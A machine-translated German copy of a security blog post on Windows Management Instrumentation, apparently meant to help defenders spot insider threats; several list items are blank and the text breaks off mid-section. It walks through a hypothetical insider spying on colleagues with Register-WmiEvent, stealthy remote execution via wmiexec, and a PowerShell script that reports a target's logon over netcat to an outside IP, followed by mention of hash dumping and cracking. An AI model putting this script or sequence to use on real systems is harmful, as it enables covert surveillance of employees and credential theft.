<!doctype html>
<html class="no-js" lang="de">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏽‍🤝‍👨🏾 🍍 🧒🏼 Windows Management Instrumentation (WMI) -Handbuch: Grundlegendes zu WMI-Angriffen 🙌🏾 🧝🏾 🧑🏼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Windows Management Instrumentation (WMI) ist ein PowerShell-Subsystem, mit dem Administratoren auf leistungsstarke Systemüberwachungstools zugreifen k...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Windows Management Instrumentation (WMI) -Handbuch: Grundlegendes zu WMI-Angriffen</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/507068/"><img src="https://habrastorage.org/webt/wm/nj/qv/wmnjqvqbgcfcfxcp3omsbeuk4xi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Windows Management Instrumentation (WMI) ist ein PowerShell-Subsystem, mit dem Administratoren auf leistungsstarke Systemüberwachungstools zugreifen können. Dieses Toolkit wurde als schnelles und effektives Systemadministrationstool konzipiert, aber nicht jeder nutzt es für gute Zwecke: Mit seiner Hilfe können Insider andere Mitarbeiter ausspionieren. Wenn Sie diese WMI-Sicherheitsanfälligkeit kennen, können Sie interne Bedrohungen leichter erkennen und bekämpfen. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In diesem Artikel werden wir untersuchen, was WMI-Tools sind, warum sie benötigt werden und wie sie zur Verfolgung von Insideraktivitäten im System verwendet werden können. Wir haben auch einen detaillierteren Leitfaden zu WMI-Ereignissen und Insider-Spionage zusammengestellt, den Sie </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kostenlos herunterladen können.</font></font></a><br>
<a name="habracut"></a><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Kurzer Rückblick: Was ist WMI und wofür ist es?</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/0t/au/hp/0tauhpqfa_9fk8xebbdasj4e3je.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir geben ein konkretes Beispiel. </font><font style="vertical-align: inherit;">Mit WMI können Sie beispielsweise alle großen Excel-Dateien anfordern, die sich in einem bestimmten Verzeichnis befinden, und dann jedes Mal eine Benachrichtigung erhalten, wenn Sie eine Datei mit einer bestimmten Größe erstellen, z. B. 1 MB. </font><font style="vertical-align: inherit;">Mit dem </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cmdlet Register-WmiEvent</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> können </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">Sie</font></a><font style="vertical-align: inherit;"> dies alles mit einer einzigen, nicht zu komplizierten Zeile in PowerShell tun. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In guten Händen kann WMI vielen guten Zwecken dienen, aber auch zu einem Werkzeug für böswillige Insideraktivitäten werden. </font><font style="vertical-align: inherit;">Sie können sich leicht vorstellen, wie eine Person mit den Gewohnheiten von Edward Snowden WMI verwendet, um seine Kollegen auszuspionieren. </font><font style="vertical-align: inherit;">Dazu benötigt er nicht einmal spezielle technische Kenntnisse.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Angenommen, unser hypothetischer Insider hat „versehentlich“ ausspioniert, dass sein Kollege Lex regelmäßig große Excel-Dateien mit Sozialversicherungsnummern und anderen persönlichen Daten von Kunden herunterlädt. </font><font style="vertical-align: inherit;">In diesem Fall kann unser unauffälliger Insider so etwas bauen:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance isa 'CIM_DataFile' and TargetInstance.FileSize &gt; 2000000 and TargetInstance.Path = '\\Users\\lex\\Important' and targetInstance.Drive = 'C:’ and targetInstance.Extension =’xlsx’” -Action $action </code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dieser Code fragt das </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CIM_DataFile-</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Objekt ab, </font><font style="vertical-align: inherit;">um auf Informationen zum Erstellen der Excel-Datei im angegebenen Verzeichnis zuzugreifen, und startet dann die Ausführung des </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">Skriptblocks</font></a><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Gegen Ende dieses Artikels werden wir uns genauer ansehen, wie dieser Szenarioblock im Fall unseres hypothetischen Insiders aussehen könnte.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wofür wird das Windows Management Toolkit verwendet?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bevor wir uns mit der Frage befassen, wie WMI von Insidern zu Verfolgungszwecken verwendet werden kann, ist anzumerken, dass es viele legitime Verwendungszwecke hat. </font><font style="vertical-align: inherit;">Der globale Zweck dieses Systems besteht darin, alle Steuerelemente für Geräte und Anwendungen in Unternehmensnetzwerken zusammenzuführen. </font><font style="vertical-align: inherit;">Somit kann WMI verwendet werden:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> um Informationen über den Status lokaler und entfernter Computersysteme zu sammeln </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sicherheitseinstellungen für Remotecomputer und -anwendungen</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Einstellen und Bearbeiten von Systemeigenschaften</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Festlegen und Bearbeiten von Berechtigungen für autorisierte Benutzer und Gruppen</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Codeausführung und Serialisierung von Objekten (eine </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Art "SSH auf Steroiden"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Laufwerksbezeichnungen zuweisen und bearbeiten</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Erstellen eines Prozessplans</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sicherungsobjekt-Repositorys</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Aktivieren und Deaktivieren der Fehlerprotokollierung</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Auf alle diese Funktionen kann mit PowerShell und WMIC, der WMI-Befehlszeilenschnittstelle, zugegriffen werden. </font><font style="vertical-align: inherit;">Wie Sie sehen können, verfügt WMI über eine Vielzahl von Anwendungen. Mit diesem System können Sie viele verschiedene Parameter in einem Computernetzwerk verfolgen und bearbeiten.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Management Instrumentation Architecture</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/2w/tf/ij/2wtfijgpvxpx9nijaapuk9a74gg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das WMI-Toolkit ist Teil des Windows-Betriebssystems und auf allen Betriebssystemen ab Windows 2000 vorinstalliert. WMI besteht aus folgenden Komponenten:</font></font><br>
<br>
<ul>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Der WMI-Dienst</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ist eine Implementierung des WMI-Systems unter Windows. </font><font style="vertical-align: inherit;">Dieser Prozess wird unter dem Namen "Windows Management Instrumentation" angezeigt und ist die Verbindung zwischen den WMI-Anbietern, dem WMI-Repository und den Verwaltungsanwendungen. </font><font style="vertical-align: inherit;">Dieser Vorgang startet automatisch, wenn Sie den Computer einschalten.</font></font></li>
<li><strong> </strong> —        ,      WMI.        ,  WMI        ,       Windows,    .</li>
<li><strong> WMI </strong> —  ,       .      WMI   ,      .        Windows.</li>
<li><strong> </strong>  WMI     WMI.      ,     .   WMI       .</li>
<li><strong></strong>,     ,         . ,           .              .</li>
<li><strong> WMI</strong> —   ,      ,   WMI.      .         WMI.</li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Der CMI-Objektmanager</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ist ein System, das sich zwischen der Verwaltungsanwendung und den WMI-Anbietern befindet. </font><font style="vertical-align: inherit;">Sie fordert Daten von diesen Anbietern an und überträgt sie dann an die Anwendung.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Die WMI-API</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> führt diese Vorgänge aus und bietet Anwendungen Zugriff auf die WMI-Infrastruktur, ohne an den verwendeten Gerätetyp gebunden zu sein.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ein WMI-Consumer</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ist eine Entität, die über den Objektmanager Anforderungen an Objekte sendet. </font><font style="vertical-align: inherit;">In der Regel ist ein WMI-Consumer eine Überwachungsanwendung, z. B. der PRTG-Netzwerkmonitor, auf der die Anwendung ausgeführt wird, oder ein PowerShell-Skript.</font></font></li>
</ul><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI-Anfragen stellen</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Der einfachste Weg, eine WMI-Anforderung auszuführen, besteht darin, WMIC in einer Standard-Windows-Befehlszeile auszuführen. </font><font style="vertical-align: inherit;">Führen Sie die folgenden Schritte aus, um Informationen zum auf dem lokalen Computer verwendeten Prozessor zu erhalten:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Öffnen Sie die Eingabeaufforderung</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Geben Sie WMIC ein, um das Programm aufzurufen, und drücken Sie die Eingabetaste </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Das WMIC-Eingabeaufforderungsfenster wird angezeigt.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">An der Eingabeaufforderung können Sie WMI-Anforderungen ausführen. </font><font style="vertical-align: inherit;">Die einfachste Anforderung besteht darin, Informationen zum lokalen Prozessor anzuzeigen, die mit dem folgenden Befehl ausgeführt werden können:</font></font><br>
<pre><code class="plaintext hljs">WMIC CPU</code></pre><br>
</li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Die Ergebnisse werden in der Befehlszeile angezeigt.</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Fast alle Befehle, die unten erläutert werden, werden auf diese Weise ausgeführt. </font><font style="vertical-align: inherit;">Mit WMI können Sie jedoch viel detailliertere Informationen als Prozessorinformationen erhalten, auch von Remotecomputern und -anwendungen.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Workshop zur Verwendung von WMI-Ereignissen zur Überwachung eines Systems</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In diesem Abschnitt erfahren Sie, wie Sie mit WMI Befehle ausführen und Prozesse auf Remotecomputern überwachen. </font><font style="vertical-align: inherit;">Solche Techniken können als Teil </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">des Benutzer- und Entitätsverhaltensanalysesystems (UEBA) verwendet werden</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , um Prozesse im gesamten System automatisch zu überwachen und </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nach Insider-Bedrohungen zu </font></font></a><font style="vertical-align: inherit;"><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">suchen</font></a><font style="vertical-align: inherit;"> , die durch verdächtiges Verhalten oder abnormale Ereignisse belegt werden.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Verwenden der wmiexec-Funktionalität von Impacket</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In WMI können Sie neben der Ereignisverwaltung verschiedene Funktionen ausführen. Darin können Sie Prozesse starten und Befehle in Windows-Fenstern sowohl auf lokalen als auch auf Remotecomputern ausführen. </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Geben</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Sie zum Spaß </font><font style="vertical-align: inherit;">in einer PowerShell-Sitzung den Befehl </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">wmic</font></a><font style="vertical-align: inherit;"> process call create 'notepad.exe' ein, um den alten Microsoft-Texteditor zu öffnen. Es verwendet das wunderbare wmic-Befehlszeilentool, das in WMI enthalten ist. Großartig, richtig? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn ich die Option / Node: und dann den Namen des Windows-Remotecomputers hinzufüge, kann ich Notepad darauf ausführen, sofern ich über die entsprechenden Berechtigungen verfüge. Es ist klar, dass wmic auf praktischer Ebene ein unverzichtbares Werkzeug für Systemadministratoren ist.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bevor Sie mit dem erneuten Senden beginnen: Ich weiß, dass es entsprechende </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell-Cmdlets gibt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Ich finde die wmic-Syntax jedoch leichter zu merken. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es wäre großartig, wenn ich WMI verwenden könnte, um eine einfache und unsichtbare Pseudo-Shell zu erstellen.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/gu/nl/1j/gunl1jzoplcyeo2axlgjwd6bifw.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Eine versteckte Pseudo-Shell, die mit wmiexec erstellt wurde. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zu meinem Glück kann dies in Impacket durchgeführt werden. In der Amazon-Testumgebung habe ich mein Lieblings- </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmiexec verwendet</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , um über die virtuelle Linux-Maschine auf WMI zuzugreifen. Wmiexec bietet die Möglichkeit, eine Pseudo-Shell zu erstellen: Jedes Mal, wenn ein Befehl auf der Clientseite eingegeben wird, wird auf dem Zielcomputer eine separate Shell erstellt, um diesen Befehl auszuführen. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sowohl psexec als auch smbexec verwenden Windows-Dienste, um Befehle auf einem Remote-System auszuführen. Smbexec wird unbeaufsichtigt ausgeführt, da der Dienst schnell erstellt und dann gelöscht wird, und psexec lässt ihn im Gegenteil in Sicht.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/vk/mb/ik/vkmbiktrjf4cn49ihyxvhp12u0w.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Das Tool wmiexec führt cmd.exe direkt aus, um den Befehl remote auszuführen. </font><font style="vertical-align: inherit;">Der erstellte Befehl befindet sich in der Ereignisanzeige. </font><font style="vertical-align: inherit;">Beachten Sie, dass wir die aufmerksamkeitsstarken Windows-Dienste vermieden haben. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das wmiexec-Tool wirkt sich überhaupt nicht auf die Dienste aus, sondern verwendet die oben beschriebenen WMI-Funktionen, um den Prozess direkt zu starten. </font><font style="vertical-align: inherit;">Bei der Suche nach möglichen Bedrohungsquellen beginnen Sicherheitsexperten selten mit WMI, während Dienste normalerweise ein guter Ort sind, um nach Hinweisen auf einen Angriff zu suchen. </font><font style="vertical-align: inherit;">Guter Zug, wmiexec!</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Verwenden von WMI-Ereignissen zum Überwachen von Benutzern</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Während ich mich mit dem Gedanken amüsierte, dass ich so schlau war und mit WMI experimentierte, stellte sich heraus, dass die an Penetrationstests beteiligten Leute lange verstanden hatten, wie alles funktionierte. Sie sollten auf jeden Fall </font><font style="vertical-align: inherit;">Matt Graebers </font><font style="vertical-align: inherit;">erstaunliche </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Präsentation</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> von der Black Hat-Konferenz 2015 </font><font style="vertical-align: inherit;">lesen </font><font style="vertical-align: inherit;">, in der er darüber spricht, wie Angreifer WMI und sein gesamtes Event-Arsenal in ein Hacking-Tool verwandeln können. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In meiner Geschichte stelle ich mir einen Insider a la Snowden vor, der über einige technische Kenntnisse, aber keine tiefe Hacking-Weisheit verfügt und dem andere Mitarbeiter vertrauen. Diese Person muss nicht alles über WMI wissen. Er muss nur wissen, was erforderlich ist, um auf einem Remotecomputer zu arbeiten und Ereignisse auszulösen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Neben </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dateiobjekten</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> gibt es eine weitere interessante Klasse von Objekten, die mit WMI gelernt werden können: </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">win32_LogOnSession</font></a><font style="vertical-align: inherit;"> . Durch Abfragen dieses grundlegenden Windows-Objekts können Sie die Benutzer finden, die sich derzeit auf dem System befinden. Sie können dann den Aktionsskriptblock Register-WmiEvent verwenden, um das PowerShell-Skript auszuführen, wenn sich ein neuer Benutzer remote anmeldet. Verstanden? Ein Angreifer kann jedes Mal Benachrichtigungen erhalten, wenn sich ein Benutzer, den er überwacht, beim Zielsystem anmeldet. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Folgendes habe ich skizziert:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" –Action $action</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die nächste Frage ist, wie die Ausführung eines Skriptblocks programmiert wird. Ein mysteriöser Insider aus meinen Fantasien interessiert sich für einen bestimmten Benutzer - Cruell. Unsere Bösewichtin hat Cruella langsam ausspioniert und plant nun, die gesammelten Informationen zu verwenden, um ihr Arbeitskonto zu knacken. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Aufgabe des Skriptblocks besteht darin, zu überprüfen, wer angemeldet ist, und festzustellen, ob es sich um Cruella handelt. Ich habe zu diesem Zweck einige Zeilen PowerShell-Code geschrieben, aber dies ist eindeutig nicht der beste Weg. Ich verwende nicht die an den Skriptblock übertragenen Ereignisinformationen, nämlich die Informationen über den neuen Benutzer. Ich stoße auf Hindernisse, deren Gründe ich momentan nicht verstehen kann. Dies erfordert mehr technisches Wissen, als unser hypothetischer Insider erwerben kann oder will.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Stattdessen habe ich einfach die Liste der von gwmi Win32_Process zurückgegebenen Benutzer durchgesehen (versuchen Sie, dieses Cmdlet in einer PowerShell-Sitzung auszuführen) und sie mit dem Cruell-Parameter abgeglichen. </font><font style="vertical-align: inherit;">Sie können meine endgültige Entscheidung bewundern:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {<font></font>
<font></font>
$names=gwmi Win32_Process|% { $_.GetOwner().User}<font></font>
foreach ($user in $names){<font></font>
<font></font>
    if ($user -eq "cruella") {<font></font>
<font></font>
        echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80<font></font>
    }<font></font>
}<font></font>
<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mit Register-WmiEvent können Sie Stealth beibehalten, da es erst startet, wenn Sie sich erneut anmelden, anstatt regelmäßig das Win32_Process-Objekt anzufordern, was durchaus auffällig sein kann. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Denken Sie daran, dass unser Insider versucht, keine Aufmerksamkeit zu erregen. </font><font style="vertical-align: inherit;">Sie hat Zugriff auf das Remote-System über psexec, smbexec oder wmiexec (der unauffälligste Weg). </font><font style="vertical-align: inherit;">Sie muss jedoch nicht ständig im System des Opfers herumlaufen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das ist das Schöne an der Verwendung von WMI-Ereignissen. </font><font style="vertical-align: inherit;">Sie können auf die Benachrichtigung von Register-WmiEvent warten und dann ruhig umziehen.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat- und WMI-Integration</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aber wie bringt das Skript die heiße Nachricht, dass Cruella am Zielcomputer angemeldet ist? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn Sie feststellen, dass ich die oben genannten Netcat-Befehle verwendet habe, können Sie sich selbst ein Plus geben. </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ist ein bekanntes und universelles Dienstprogramm, mit dem Sie Verbindungen herstellen können (optional für Malware). Damit können Sie eine umgekehrte Verbindung herstellen oder einfach Nachrichten über das Netzwerk senden. Ich habe diese zweite Gelegenheit genutzt. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das obige Skript sendet eine Netcat-Nachricht im Standby-Modus und zeigt "Cruella angemeldet" an. Mission erfüllt. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sie können sich vorstellen, wie unser Betrüger dann Hashes mit dem </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Secretsdump Impacket-Tool ablegt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Knacken Sie den Hash mit den Cruella-Anmeldeinformationen und starten Sie wmiexec mit Cruella-Berechtigungen, um nach wertvolleren Daten zu suchen.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ca/en/ni/caennizhyw6u4_yuldedujkbowa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Register-WmiEvent-Code kann direkt ausgeführt werden. </font><font style="vertical-align: inherit;">Achten Sie auf die angezeigte Ereigniskennung</font></font><br>
 <br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fehlerbehebung bei der WMI-Überwachung</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Als Teil dieses Beispiels wollte ich (mit wmiexec) ein nützliches Programm aus der Ferne ausführen, das mich benachrichtigt, wenn sich ein bestimmter Benutzer, dh Cruella, anmeldet. Danach konnte ich ihre Anmeldeinformationen sicher zurücksetzen und knacken. Dies wäre der unauffälligste Weg - Fernzugriff und keine Dateien. Das einzige Problem, so schien es mir zunächst, war die vorübergehende Natur der WMI-Ereignisse. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Daher musste ich mein obszönes langes Register-WMIEvent (unten) in die PowerShell-Befehlszeile mit dem Parameter –noexit einfügen, um sicherzustellen, dass die PowerShell-Sitzung nach dem Register-Ereignis gespeichert wird und daher das Ereignis gespeichert wird.</font></font><br>
<br>
<pre><code class="plaintext hljs"> Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {$names=gwmi Win32_Process|% { $_.GetOwner().User};foreach ($user in $names){if ($user -eq "cruella") {echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80}}}
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Als ich anfing, daran zu arbeiten, wurde mir klar, dass ich Sonderzeichen wie $, "und |" konvertieren "und sie als Literale direkt an PowerShell übergeben musste. </font><font style="vertical-align: inherit;">Noch ein Kopfschmerz: Ich musste schließlich auf die Verwendung vertikaler Linien verzichten, da diese Analysefehler verursachten. </font><font style="vertical-align: inherit;">Frag nicht. </font><font style="vertical-align: inherit;">Allmählich kam ich zu dieser langen Codezeile:</font></font><br>
<br>
